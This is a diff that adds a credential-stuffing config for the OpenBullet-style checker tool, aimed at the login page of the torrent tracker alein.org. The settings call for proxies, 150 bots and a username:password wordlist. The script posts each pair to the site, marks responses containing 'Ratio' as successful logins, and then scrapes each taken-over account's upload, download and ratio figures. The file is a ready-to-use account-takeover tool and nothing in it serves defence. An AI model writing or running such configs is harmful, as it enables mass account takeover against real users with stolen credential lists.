@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Alein.ORG",
+  "SuggestedBots": 150,
+  "LastModified": "2018-05-28T22:53:20.7415062+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "http://alein.org/index.php?page=login&returnto=http%3A%2F%2Falein.org" AutoRedirect=TRUE 
+  CONTENT "uid=<USER>&pwd=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: http://alein.org/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Ratio" 
+  KEYCHAIN Failure OR 
+    KEY "Password Incorrect" 
+    KEY "Username Incorrect" 
+#CAPTURE REQUEST GET "http://alein.org" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: http://alein.org" 
+#PARSE_UP PARSE "<SOURCE>" REGEX "<td class=\"green\" align=\"center\">&uarr;&nbsp;([^<]*)" "[1]" Recursive=FALSE -> CAP "Upload" "" "" 
+#PARSE_DOWN PARSE "<SOURCE>" LR "<td class=\"red\" align=\"center\">&uarr;&nbsp;([^<]*)" "[2]" Recursive=FALSE -> CAP "Download" "" "" 
+#PARSE_RATIO PARSE "<SOURCE>" LR "<td class=\"white\" align=\"center\">&uarr;&nbsp;([^<]*)" "[2]" Recursive=FALSE -> CAP "Ratio" "" "" 
